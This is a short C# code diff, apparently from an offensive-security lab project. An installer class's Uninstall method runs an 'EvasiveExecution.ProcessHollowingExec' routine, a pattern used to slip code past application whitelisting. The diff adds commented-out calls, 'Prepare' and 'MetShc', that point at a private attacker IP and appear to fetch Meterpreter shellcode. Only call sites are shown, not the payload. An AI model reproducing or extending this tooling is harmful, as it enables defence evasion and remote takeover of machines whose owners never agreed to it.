@@ -8,7 +8,8 @@ namespace Execution
         public override void Uninstall(System.Collections.IDictionary savedState)
         {
             Console.WriteLine("Executing");
-            //Execution.Func.EvasiveExecution.Prepare("192.168.45.195").Wait();
+            //Execution.Func.EvasiveExecution.Prepare("192.168.49.120");
+            //Execution.Func.EvasiveExecution.MetShc("192.168.49.120");
             Execution.Func.EvasiveExecution.ProcessHollowingExec();
         }
     }
